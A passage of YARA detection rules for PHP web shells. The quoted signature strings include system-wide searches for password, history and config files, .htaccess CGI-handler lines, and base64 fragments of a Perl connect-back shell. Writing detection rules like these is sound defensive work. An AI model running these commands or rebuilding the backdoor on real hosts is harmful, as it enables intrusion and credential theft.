      description = "php17 - from files 01f78be6f7cad02658508fe4616098a9.php, 0353ab4cbed5beae847a7ff6e220b5cf.php, 05311655a15b75fab86956663e1819cd.php, 0771fc6f0f4b1d7d1bb73bbbe14e0e31.php, 0ad17701cf5e5a59aa57f35aa240d9e40d28ba50.php, 0b544ac96e173af11ffee87dee8aad446339801e.php, 15e786a334203308d12856d155bbdb8088ed8afc.php, 1898eebe767f4dda4709621164eeef8377c43bb3.php, 32e36b9cd77416c8e4d5d7284d54683e75abfed6.php, 4d5d25e5c18789e5e3977c1d7f6035576a7e2ea3.php, 626c5c9305cee457e10b85c81af262c5bc437255.php, 6612561e19ec45c494d5154c3b502a2e72817735.php, 6a6f0260611dcd60d502d308f74ff3c1ad590cfe.php, 8cb6a80a86bf37cd3977cab94909c299ec22a092.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ae6e0b74f1a1697985e45ec9fbd291fbc9ace52680fc2fd14726abf66859138a"
      hash2 = "b6f96297c1c905e32413c6deb7e794cb8a1af37b9295e5cff257a6ff063ccbd4"
      hash3 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
      hash4 = "faeff8e37876023a6f84c94e090b22c9b3eea333ed96d2688c45d8900f7cfdbc"
      hash5 = "59f77ca5eb2380fcee10e7282bdcbb628a075bd83ff3dfabd2b8851cc80a466b"
      hash6 = "12e93dd17c20d1aef103ccc66e1b7d5b3849b81a0ab88e8c03777a7a88fbebf0"
      hash7 = "f89d440580f05dbadc7464f2ef8d0048d367422d6fce60995a0f33467284e503"
      hash8 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
      hash9 = "5ac936e86e90cda1df398a4f3044c9d6d1707bc6ddf5d1bbdfc9e03553ff907b"
      hash10 = "ce802123ee19441adab36ef70584cfadbbda898ed1d52082a08532e20c860dc1"
      hash11 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
      hash12 = "bf83456b0b6f02b4bc25f1848c7f825cd7505f2c740f01c1a254df33bfebfa06"
      hash13 = "178ec234348b08e4da3d0d26f0e0db9637184e9fb4aec6b7345a5521c54456ac"
      hash14 = "f5e8951fddabbfebee6f93380486d027fd88f05623f3856dcf81ae05e78d9da6"
   strings:
      $s1 = "array(\"find config* files in current dir\", \"find . -type f -name \\\"config*\\\"\")," fullword ascii
      $s2 = "array(\"find config* files\", \"find / -type f -name \\\"config*\\\"\")," fullword ascii
      $s3 = "array(\"find service.pwd files in current dir\", \"find . -type f -name service.pwd\")," fullword ascii
      $s4 = "array(\"find config.inc.php files\", \"find / -type f -name config.inc.php\")," fullword ascii
      $s5 = "array(\"find all service.pwd files\", \"find / -type f -name service.pwd\")," fullword ascii
      $s6 = "array(\"show opened ports\", \"netstat -an | grep -i listen\")" fullword ascii
      $s7 = "array(\"find .htpasswd files in current dir\", \"find . -type f -name .htpasswd\")," fullword ascii
      $s8 = "array(\"list file attributes on a Linux second extended file system\", \"lsattr -va\")," fullword ascii
      $s9 = "array(\"find all .htpasswd files\", \"find / -type f -name .htpasswd\")," fullword ascii
      $s10 = "array(\"find .bash_history files in current dir\", \"find . -type f -name .bash_history\")," fullword ascii
      $s11 = "array(\"find .fetchmailrc files in current dir\", \"find . -type f -name .fetchmailrc\")," fullword ascii
      $s12 = "me\"].\" (can't copy \\\"\".$uploadfile[\"tmp_name\"].\"\\\" to \\\"\".$uploadpath.$destin.\"\\\"!<br>\";}" fullword ascii
      $s13 = "array(\"find all .bash_history files\", \"find / -type f -name .bash_history\")," fullword ascii
      $s14 = "array(\"-----------------------------------------------------------\", \"ls -la\")," fullword ascii
      $s15 = "array(\"find all .fetchmailrc files\", \"find / -type f -name .fetchmailrc\")," fullword ascii
      $s16 = "array(\"find sgid files in current dir\", \"find . -type f -perm -02000 -ls\")," fullword ascii
      $s17 = "array(\"find suid files in current dir\", \"find . -type f -perm -04000 -ls\")," fullword ascii
      $s18 = "array(\"show opened ports\", \"netstat -an\")" fullword ascii
      $s19 = "array(\"find all sgid files\", \"find / -type f -perm -02000 -ls\")," fullword ascii
      $s20 = "array(\"find all suid files\", \"find / -type f -perm -04000 -ls\")," fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x733c or uint16(0) == 0x6544 or uint16(0) == 0x2a2f ) and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _031d3c46f8a4462cf23accc3aaecf840f77d9a30_144b414a2168fecf31591bbe049e1424ccff4899_1477fa53e5e56605fe001c88831fcb71e30d6e86__260
{
   meta:
      description = "php17 - from files 031d3c46f8a4462cf23accc3aaecf840f77d9a30.php, 144b414a2168fecf31591bbe049e1424ccff4899.php, 1477fa53e5e56605fe001c88831fcb71e30d6e86.php, 1dc03138e5406f8e1f850181e92084ed0f4b5302.php, 35940353c0f3d6511e2789fc3cb9e5b3cea3b10d.php, 5bcb3adc55b62f4e43f154b29d31cced0cbd32a5.php, 649515a5730e7baa0303b29ce49f7e142b88c2ce.php, 691a4634dc5f78ceee68850138b8b68047b8dca6.php, 91241fc05105627c2f58942867db10b2b691574e.php, 918af72b83a165b25283dbd8f1490309dfdb77da.php, 942e0fc9984256f2bdb17f8d0c77a7afacb7b112.php, 946a66a5f7f8be95ea7693ee5500bb404b9d0add.php, 95570807b7c1a0531c134fb85c98cdc4ff63ee9b.php, a79be3a055b701ad9977b5176d0478aa0b0dffd4.php, abdbeae0be991e8bab37946a1b55df5af144a0a8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "27820c5a30e7d0c36e9e61b5f970de8121e1c493cf22ccdaa3b41f84016f8c5d"
      hash2 = "1fe4c60ea3f32819a98b1725581ac912d0f90d497e63ad81ccf258aeec59fee3"
      hash3 = "124a69cac6fa533abd737127a65ad261a4da66148bf1bdc341e3f733966b5ad6"
      hash4 = "bbbdf28407a4c943f048dcdd7da7515e42797a64b76fd2455e5403b436ec4de8"
      hash5 = "9ecdb14b41785c779d9721e11bf9e1b7e35611015f4aabf9a1f54a82eaa0725c"
      hash6 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
      hash7 = "756b788401aad4bfd4dbafd15c382d98e3ba079390addb5b0cea7ff7f985f881"
      hash8 = "3c175446e4a5ddb7ddec93c3338097f3ef96b6edb9cc10801be12346d787f3c0"
      hash9 = "2e5511e45b7c9c6ca7e263ee8d8271214b2b6aae20f2796f4db7b53639f7a699"
      hash10 = "589ad371c414fae2d6f1f0ef7d197cf495bf06d1a0e367f9c3907b77f3054299"
      hash11 = "59105e4623433d5bf93b9e17d72a43a40a4d8ac99e4a703f1d8851ad1276cd88"
      hash12 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash13 = "97ba3775928dacbf6b4d58416752db2113af88aa914bc35e7b2a7ddf73f70d8b"
      hash14 = "b7c6ce332434850db4448f8d2bf26157a6aa4ae1afb43bd5829ee6167b561c85"
      hash15 = "1a2bed0ae0b8846eb567043a998ad835d7e4103abcd6618e4ccb01a2a73a9ec9"
   strings:
      $s1 = "else if(!$sql->dump($_POST['mysql_tbl'])) { echo \"[-] ERROR! Can't create dump\"; }" fullword ascii
      $s2 = "if(empty($_POST['dif'])) { foreach($sql->dump as $v) echo $v.\"\\r\\n\"; }" fullword ascii
      $s3 = "echo sr(35,\"<b>\".$lang[$language.'_text84'].$arrow.\"</b>\".in('hidden','dir',0,$dir).in('hidden','cmd',0,'db_query'),\"\");" fullword ascii
      $s4 = "else { echo \"[-] ERROR! Can't write in dump file\"; }" fullword ascii
      $s5 = "echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump').\"<b>\".$lang[$language.'_text41'].$arrow.\"</b>\",in('ch" ascii
      $s6 = "if($unix) $_POST['e_text']=@str_replace(\"\\r\\n\",\"\\n\",$_POST['e_text']);" fullword ascii
      $s7 = "echo sr(15,\"<b>\".$lang[$language.'_text30'].$arrow.\"</b>\",in('text','test7_file',96,(!empty($_POST['test7_file'])?($_POST['t" ascii
      $s8 = "echo sr(15,\"<b>\".$lang[$language.'_text30'].$arrow.\"</b>\",in('text','test5_file',96,(!empty($_POST['test5_file'])?($_POST['t" ascii
      $s9 = "echo sr(15,\"<b>\".$lang[$language.'_text4'].$arrow.\"</b>\",in('text','test6_file',96,(!empty($_POST['test6_file'])?($_POST['te" ascii
      $s10 = "@touch($_POST['e_name'],$mtime,$mtime);" fullword ascii
      $s11 = "echo sr(35,\"\",in('submit','submit',0,$lang[$language.'_butt9']));" fullword ascii
      $s12 = "else if(!$sql->select_db()) { echo \"[-] ERROR! Can't select database\"; }" fullword ascii
      $s13 = "_file']):(\"/etc/passwd\"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test7').ws(4).in('submit','submit',0,$lang[$language" ascii
      $s14 = "_file']):(\"/etc/passwd\"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test5').ws(4).in('submit','submit',0,$lang[$language" ascii
      $s15 = "echo sr(35,\"<b>\".$lang[$language.'_text80'].$arrow.\"</b>\",$select);" fullword ascii
      $s16 = "if(!$sql->connect()) { echo \"[-] ERROR! Can't connect to SQL server\"; }" fullword ascii
      $s17 = "'eng_text111'=>'SQL-Server : Port'," fullword ascii
      $s18 = "file']):($dir))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test6').ws(4).in('submit','submit',0,$lang[$language.'_butt8']))" ascii
      $s19 = "echo sr(15,\"<b>\".$lang[$language.'_text30'].$arrow.\"</b>\",in('text','test5_file',96,(!empty($_POST['test5_file'])?($_POST['t" ascii
      $s20 = "echo sr(15,\"<b>\".$lang[$language.'_text4'].$arrow.\"</b>\",in('text','test6_file',96,(!empty($_POST['test6_file'])?($_POST['te" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _00392828ffb7aabd6c66ca775f1356eef850c8b7_1n73ction_683f78842d7cf41a39744494a4bb787d6c6c4e91_82d1122c0d297bb8dc2959e5023728a_261
{
   meta:
      description = "php17 - from files 00392828ffb7aabd6c66ca775f1356eef850c8b7.php, 1n73ction.php, 683f78842d7cf41a39744494a4bb787d6c6c4e91.php, 82d1122c0d297bb8dc2959e5023728a09a3e4e6d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "19ddef3ac56931999f086573be93b5385319b35081e9d5dbce0b8e3e16f85a64"
      hash2 = "9af1a6e4122d7751016c5aee923352962427c48ec0924bf007aac751cdad7af1"
      hash3 = "f3d0d694f2dd8b78a947a5e00c28d023c0fcc291ac5e70f74a81780bd5abb3e1"
      hash4 = "65024e9ae949507819c9344a2e134ff406e24c6e2a54ded2dab8ef8e6e7d1f83"
   strings:
      $s1 = "$metin = \"Options FollowSymLinks MultiViews Indexes ExecCGI" fullword ascii
      $s2 = "$netcatshell = 'IyEvdXNyL2Jpbi9wZXJsDQogICAgICB1c2UgU29ja2V0Ow0KICAgICAgcHJpbnQgIkRhdGEgQ2hh" fullword ascii
      $s3 = "AddHandler cgi-script .cin" fullword ascii
      $s4 = "SU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllICgiU29ja2V0IEVycm9yXG4iKTsNCiAg" fullword ascii
      $s5 = "$kokdosya = \".htaccess\";" fullword ascii
      $s6 = "AddType application/x-httpd-cgi .cin" fullword ascii
      $s7 = "MHMgQ29ubmVjdCBCYWNrIEJhY2tkb29yXG5cbiI7DQogICAgICBpZiAoISRBUkdWWzBdKSB7DQog" fullword ascii
      $s8 = "KSB8fCBkaWUoIlVua25vd24gUHJvdG9jb2xcbiIpOw0KICAgICAgc29ja2V0KFNFUlZFUiwgUEZf" fullword ascii
      $s9 = "ZyBTaGVsbFxuIjsNCiAgICAgIGlmICghZm9yayggKSkgew0KICAgICAgICBvcGVuKFNURElOLCI+" fullword ascii
      $s10 = "MV0pIHsNCiAgICAgICAgJHBvcnQgPSAkQVJHVlsxXTsNCiAgICAgIH0NCiAgICAgIHByaW50ICJb" fullword ascii
      $s11 = "Kl0gQ29ubmVjdGluZy4uLlxuIjsNCiAgICAgICRwcm90byA9IGdldHByb3RvYnluYW1lKCd0Y3An" fullword ascii
      $s12 = "ICAgICAgIHByaW50ZiAiVXNhZ2U6ICQwIFtIb3N0XSA8UG9ydD5cbiI7DQogICAgICAgIGV4aXQo" fullword ascii
      $s13 = "ICAgJGhvc3QgPSAkQVJHVlswXTsNCiAgICAgICRwb3J0ID0gODA7DQogICAgICBpZiAoJEFSR1Zb" fullword ascii
      $s14 = "ICAgIG15ICR0YXJnZXQgPSBpbmV0X2F0b24oJGhvc3QpOw0KICAgICAgaWYgKCFjb25uZWN0KFNF" fullword ascii
      $s15 = "UlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsICR0YXJnZXQpKSB7DQogICAgICAgIGRpZSgi" fullword ascii
      $s16 = "bihTVERFUlIsIj4mU0VSVkVSIik7DQogICAgICAgIGV4ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAu" fullword ascii
      $s17 = "JlNFUlZFUiIpOw0KICAgICAgICBvcGVuKFNURE9VVCwiPiZTRVJWRVIiKTsNCiAgICAgICAgb3Bl" fullword ascii
      $s18 = "MSk7DQogICAgICB9DQogICAgICBwcmludCAiWypdIER1bXBpbmcgQXJndW1lbnRzXG4iOw0KICAg" fullword ascii
      $s19 = "VW5hYmxlIHRvIENvbm5lY3RcbiIpOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBTcGF3bmlu" fullword ascii
      $s20 = "ICJcMCIgeCA0Ow0KICAgICAgICBleGl0KDApOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBE" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x6873 ) and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _0353ae68b12b8f6b74794d3273967b530d0d526f_060ad92489947d410d897474079c1477_25b2ffa40e50b038212591c4eb09a89fe10cbd43_35b0448c_262
{
   meta:
      description = "php17 - from files 0353ae68b12b8f6b74794d3273967b530d0d526f.php, 060ad92489947d410d897474079c1477.php, 25b2ffa40e50b038212591c4eb09a89fe10cbd43.php, 35b0448cd3e328b11521ab053ea0c99694119b82.php, 75aa5981c7740da3a645cd272029090750474ae1.php, 7e4723914113dcea43f5c7fe31576b45ab97bd12.php, 98d13eea07f57d3b4a2c5079cc27659dde6ebfad.php, a2baa41f5667eb2a3ad57003105e57ed0000af38.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "14ee4d6daca29a576a047ec7c30efd8c11af51635f023d13772b68aead0dfda6"
      hash2 = "70d1d6937c7b00d4909ff80dcadc7771349d918f99e3515038d550a3d8ac90f2"
      hash3 = "33b0ffc5c6dcf69ccabd978d0c8995f2f4d35d94c5dbbf350f7ded03e6ed82a0"
      hash4 = "b87a5779c3b9ff9e4830be35799a297d9f7dce01d62b6953126f80e969e2a40e"
      hash5 = "007005ffbf899f70fe325993556129086702958b592d4bf22d8465d202a1b11f"
      hash6 = "d37e7daffca28c0d039f1c41e0d960cb912975fa51e391d12eb7330e983cb5de"
      hash7 = "9ca48c9df4cd95c76600fc0ae6b525c7adc9edfb606ca5fe24aab23d952de256"
      hash8 = "7c07c724d568753b57ae312c6a01c30b0eb9b7117165ef6519d0c125fe751f08"
   strings:
      $s1 = "if(!empty($_COOKIE['act']) && @count($_COOKIE['f']) && (($_COOKIE['act'] == 'zip') || ($_COOKIE['act'] == 'tar')))" fullword ascii
      $s2 = "$explink .= urlencode($kernel . ' ' . substr($release,0,3));" fullword ascii
      $s3 = "$explink .= urlencode('Linux Kernel ' . substr($release,0,6));" fullword ascii
      $s4 = "if(strpos('Linux', $kernel) !== false)" fullword ascii
      $s5 = "if(!empty($_COOKIE['act']) && @count($_COOKIE['f']))" fullword ascii
      $s6 = "@rename($_COOKIE['c'].$f, $GLOBALS['cwd'].$f);" fullword ascii
      $s7 = "copy_paste($_COOKIE['c'],$f, $GLOBALS['cwd']);" fullword ascii
      $s8 = "$_COOKIE['f'] = @unserialize($_COOKIE['f']);" fullword ascii
      $s9 = "} elseif($_COOKIE['act'] == 'move') {" fullword ascii
      $s10 = "} elseif($_COOKIE['act'] == 'unzip') {" fullword ascii
      $s11 = "} elseif($_COOKIE['act'] == 'zip') {" fullword ascii
      $s12 = "} elseif($_COOKIE['act'] == 'tar') {" fullword ascii
      $s13 = "elseif(@is_dir($_COOKIE['c'].$f)) {" fullword ascii
      $s14 = "$zip->addFile($_COOKIE['c'].$f, $f);" fullword ascii
      $s15 = "if($zip->open($_COOKIE['c'].$f)) {" fullword ascii
      $s16 = "if(@is_file($_COOKIE['c'].$f))" fullword ascii
      $s17 = "if (!empty ($_COOKIE['f']))" fullword ascii
      $s18 = "foreach($_COOKIE['f'] as $f)" fullword ascii
      $s19 = "if($_COOKIE['act'] == 'copy') {" fullword ascii
      $s20 = "if(function_exists(\"scandir\")) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _254a3c59f7e28d66209d48d9135291eb8cd0be83_387dd602d5fe0192968d4798b87841e47d854e27_6a6f0260611dcd60d502d308f74ff3c1ad590cfe__263
{
   meta:
      description = "php17 - from files 254a3c59f7e28d66209d48d9135291eb8cd0be83.php, 387dd602d5fe0192968d4798b87841e47d854e27.php, 6a6f0260611dcd60d502d308f74ff3c1ad590cfe.php, 7c102999b65267242a29b2b296f2ce992bd23e59.php, aa8514a4fdeb999bcad59439fa0836b7178853a9.php, angel.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "75d34237cc7dab59582abafb3069af0b1c240d860766e818953ff7df7eca87f3"
      hash2 = "8c476a6b67fdba2ddbc25daacc6b316daccd91206750419e7080c95f4b41d817"
      hash3 = "178ec234348b08e4da3d0d26f0e0db9637184e9fb4aec6b7345a5521c54456ac"
      hash4 = "41b3f472978109cfb97abbcde05c81bf9085c356e7f890f805e1efd078bdf093"
      hash5 = "23738a2cfdd29fa9dc4a1ff2d56de59ee03e76ff24ccac1462e29f1581d24c5e"
      hash6 = "80fe738fc052d94595dead391df3e26647e946120973521da619997ceec386bc"
   strings:
      $s1 = "BKeTV6Y0d4cGRDZ25mQ2NwTERBc2UzMHBLUT09Z2hkZXNjb26/DJpDAAAADElEQVQIHWNgIA0AAAAwAAGErPF6AAAAAElFTkSuQmCC\"/>" fullword ascii
      $s2 = "AAB510RVh0Z2hkZQBnaGRlc2NvblpYWmhiQ2htZFc1amRHbHZiaWh3TEdFc1l5eHJMR1VzY2lsN1pUMW1kVzVqZEdsdmJpaGpLWHR5WlhSMWNtNG9ZenhoUHljbk9tVW" ascii
      $s3 = "lLVHN6SUdGOU1TQjFQVk11VkRzeElHVTlWaTVYT3pFZ2FqMGlleUlySWx4Y0luVmNYQ0k2SUZ4Y0lpSXJOaWgxS1NzaVhGd2lMQ0FpS3lKY1hDSlpYRndpT2lCY1hDSW" ascii
      $s4 = "BaaWdoSnljdWNtVndiR0ZqWlNndlhpOHNVM1J5YVc1bktTbDdkMmhwYkdVb1l5MHRLWEpiWlNoaktWMDlhMXRqWFh4OFpTaGpLVHRyUFZ0bWRXNWpkR2x2YmlobEtYdH" ascii
      $s5 = "9laWtwTzNvckszMHpJSEo5TkNCQktITXBlekVnWVQxY0oxd25PemtvTVNCcFBUQTdhVHh6TzJrckt5bDdZU3M5YkM1dEtGZ29UUzVRS0NrcVVTa3BmVE1nWVgwMElHc2" ascii
      $s6 = "BlekVnYVQwd096RWdlajB3T3pFZ2NqMWNKMXduT3prb01TQnBQVEE3YVR4a0xqYzdhU3NyS1hzMUtIbzlQWEF1TnlsNlBUQTdjaXM5YkM1dEtHUXVieWhwS1Y1d0xtOG" ascii
      $s7 = "hZMlVvYm1WM0lGSmxaMFY0Y0NnblhGeGlKeXRsS0dNcEt5ZGNYR0luTENkbkp5a3NhMXRqWFNrN2NtVjBkWEp1SUhCOUtDZFZMbmM5TkNCM0tHTXBlelFnZUNoa0xIQX" ascii
      $s8 = "xkSFZ5Ym54bWRXNWpkR2x2Ym54cFpueHpZVzU4YkdWdVozUm9mSFJpZkdadmNueDhmSHg4Zkh4OFJtbHlaV0oxWjN4OGZHVnVZM3hUZEhKcGJtZDhabkp2YlVOb1lYSk" ascii
      $s9 = "tLU2t6SUVzN015Qk1mVFFnTmloaEtYczFLRTRnWVQwOUlrOGlLVE1nWVM1RktDOWNYRnhjTDJjc0lseGNYRnhjWEZ4Y0lpa3VSU2d2WEZ3aUwyY3NJbHhjWEZ4Y1hDSW" ascii
      $s10 = "VLR2tzTVRZcExHSXViaWhwTERFMktTbDlNeUI0S0dJc2NDbDlOQ0E0S0NsN015Z3lMbkU5UFhRdVNDWW1NaTUyUFQxMExrY3BmVFFnZVNncGV6RWdZVDFTT3pVb0tESX" ascii
      $s11 = "hlU2dwS1hzeE15QXhOQ2dwTGpFMVBWd25NVGM2THk4eE9DMHhPUzFHTGpGaUwwWXZQMkU5WENjck1XTW9ZU2w5ZlNjc05qSXNOelVzSjN4MllYSjhkMmx1Wkc5M2ZISm" ascii
      $s12 = "laWFIxY200Z2NsdGxYWDFkTzJVOVpuVnVZM1JwYjI0b0tYdHlaWFIxY200blhGeDNLeWQ5TzJNOU1YMDdkMmhwYkdVb1l5MHRLV2xtS0d0YlkxMHBjRDF3TG5KbGNHeG" ascii
      $s13 = "hOakF3ZkhSeWRXVjhabUZzYzJWOFRXRjBhSHgwZVhCbGIyWjhjM1J5YVc1bmZISmhibVJ2Ylh3eU5UVjhNVFl3ZkdSdlkzVnRaVzUwZkZWU1RIeDBhR2x6Zkc1aGRtbG" ascii
      $s14 = "9jR0Z5YzJWSmJuUW9ZeTloS1NrcEt5Z29ZejFqSldFcFBqTTFQMU4wY21sdVp5NW1jbTl0UTJoaGNrTnZaR1VvWXlzeU9TazZZeTUwYjFOMGNtbHVaeWd6TmlrcGZUdH" ascii
      $s15 = "lLellvWlNrcklseGNJaXdnSWlzaVhGd2lXbHhjSWpvZ1hGd2lJaXMyS0dNcEt5SmNYQ0lnSWlzaWZTSTdNU0JtUFdzb2Fpd2lNVEVpS1RzeElHRTlNVElvWmlrN05TZ2" ascii
      $s16 = "tiMjFmYzNSeWZHTm9jbTl0Wlh4dmRYUmxjbGRwWkhSb2ZHOTFkR1Z5U0dWcFoyaDBmSEpsY0d4aFkyVjhZVzVoYkhsMGFXTnpmR2hsYVdkb2RIeDNhV1IwYUh3ek5UQj" ascii
      $s17 = "RiMlJsZkhOMVluTjBjbnhqYUdGeVEyOWtaVUYwZkh4cGJtNWxjbGRwWkhSb2ZIeDhjMk55WldWdWZIeHBibTVsY2tobGFXZG9kSHhyYTN4OFkyUjhmR2RsYmw5eVlXNW" ascii
      $s18 = "5ZWFJ2Y254MWMyVnlRV2RsYm5SOGNHRnljMlZKYm5SOGRXRjhibk44YVhOSmJtbDBhV0ZzYVhwbFpIeHNNbGhXUjJkalNYUTFNV3QwUW1scFdFUTNRakZ0YzFVelMwNU" ascii
      $s19 = "RhamgyTVh4aWRHOWhmRzVsZDN4SmJXRm5aWHh6Y21OOGZHaDBkSEI4WjI5dloyeGxmSE4wWVhScFkzeDNhR2xzWlh4amIyMThaVzVqYjJSbFZWSkpRMjl0Y0c5dVpXNT" ascii
      $s20 = "VhQ1ltTWk1b0xrSW1Kakl1YUM1Q0xqRXdLWHg4S0RJdVF5MHlMbkUrWVNsOGZDZ3lMa1F0TWk1MlBtRXBmSHdvT0NncEppWXlMa1E4U1NsOGZDZzRLQ2ttSmpJdVF6eE" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _031d3c46f8a4462cf23accc3aaecf840f77d9a30_1b45fc7d2a485cce8295a4962b581979b08fb01d_20784cd31c22ddaa849b6c93042df34c1d462ab9__264
{
   meta:
      description = "php17 - from files 031d3c46f8a4462cf23accc3aaecf840f77d9a30.php, 1b45fc7d2a485cce8295a4962b581979b08fb01d.php, 20784cd31c22ddaa849b6c93042df34c1d462ab9.php, 35940353c0f3d6511e2789fc3cb9e5b3cea3b10d.php, 5bcb3adc55b62f4e43f154b29d31cced0cbd32a5.php, 5e74b8d3ac3844c24f0642b80a3c8696.php, 61466b28920b5c7fe7f9020295d027347d9cc1c3.php, 691a4634dc5f78ceee68850138b8b68047b8dca6.php, 6f1a2aa579a8ecd60d17677f0cd211c4090500f6.php, 7bd7bb6237c7654d933dc363cabbc553f9d21382.php, 918af72b83a165b25283dbd8f1490309dfdb77da.php, 942e0fc9984256f2bdb17f8d0c77a7afacb7b112.php, 946a66a5f7f8be95ea7693ee5500bb404b9d0add.php, 95570807b7c1a0531c134fb85c98cdc4ff63ee9b.php, abdbeae0be991e8bab37946a1b55df5af144a0a8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "27820c5a30e7d0c36e9e61b5f970de8121e1c493cf22ccdaa3b41f84016f8c5d"
      hash2 = "06fa69321e2a28a683c7dc14381132981804aa20fe860c596fa504d8646cef57"
      hash3 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash4 = "9ecdb14b41785c779d9721e11bf9e1b7e35611015f4aabf9a1f54a82eaa0725c"
      hash5 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
      hash6 = "a97f9d0c8747d4acd6d22ff6f7a96cce11165b55e68dc5883a515c8d40a645e2"
      hash7 = "79f1a6a508b704825f4090096b2ce143fcbb335494cfd76b79172890181d93a5"
      hash8 = "3c175446e4a5ddb7ddec93c3338097f3ef96b6edb9cc10801be12346d787f3c0"
      hash9 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
      hash10 = "617ed1a8b61dd1f84acd225bfe8dc36c479a1ad3c98b2bb335b2735cb4fb2fe7"
      hash11 = "589ad371c414fae2d6f1f0ef7d197cf495bf06d1a0e367f9c3907b77f3054299"
      hash12 = "59105e4623433d5bf93b9e17d72a43a40a4d8ac99e4a703f1d8851ad1276cd88"
      hash13 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash14 = "97ba3775928dacbf6b4d58416752db2113af88aa914bc35e7b2a7ddf73f70d8b"
      hash15 = "1a2bed0ae0b8846eb567043a998ad835d7e4103abcd6618e4ccb01a2a73a9ec9"
   strings:
      $s1 = "'find config.inc.php files in current dir'=>'find . -type f -name config.inc.php'," fullword ascii
      $s2 = "'find config* files in current dir'=>'find . -type f -name \"config*\"'," fullword ascii
      $s3 = "'find service.pwd files in current dir'=>'find . -type f -name service.pwd'," fullword ascii
      $s4 = "'find config.inc.php files'=>'find / -type f -name config.inc.php'," fullword ascii
      $s5 = "'find all service.pwd files'=>'find / -type f -name service.pwd'," fullword ascii
      $s6 = "'find .htpasswd files in current dir'=>'find . -type f -name .htpasswd'," fullword ascii
      $s7 = "'list file attributes on a Linux second extended file system'=>'lsattr -va'," fullword ascii
      $s8 = "'find all .htpasswd files'=>'find / -type f -name .htpasswd'," fullword ascii
      $s9 = "'find .bash_history files in current dir'=>'find . -type f -name .bash_history'," fullword ascii
      $s10 = "'find all writable directories and files in current dir'=>'find . -perm -2 -ls'," fullword ascii
      $s11 = "'find .fetchmailrc files in current dir'=>'find . -type f -name .fetchmailrc'," fullword ascii
      $s12 = "'find all writable files in current dir'=>'find . -type f -perm -2 -ls'," fullword ascii
      $s13 = "'find all writable directories in current dir'=>'find . -type d -perm -2 -ls'," fullword ascii
      $s14 = "'find all .fetchmailrc files'=>'find / -type f -name .fetchmailrc'," fullword ascii
      $s15 = "'find all .bash_history files'=>'find / -type f -name .bash_history'," fullword ascii
      $s16 = "'find all writable directories'=>'find /  -type d -perm -2 -ls'," fullword ascii
      $s17 = "'find suid files in current dir'=>'find . -type f -perm -04000 -ls'," fullword ascii
      $s18 = "'find sgid files in current dir'=>'find . -type f -perm -02000 -ls'," fullword ascii
      $s19 = "'find all writable files'=>'find / -type f -perm -2 -ls'," fullword ascii
      $s20 = "'find suid files'=>'find / -type f -perm -04000 -ls'," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

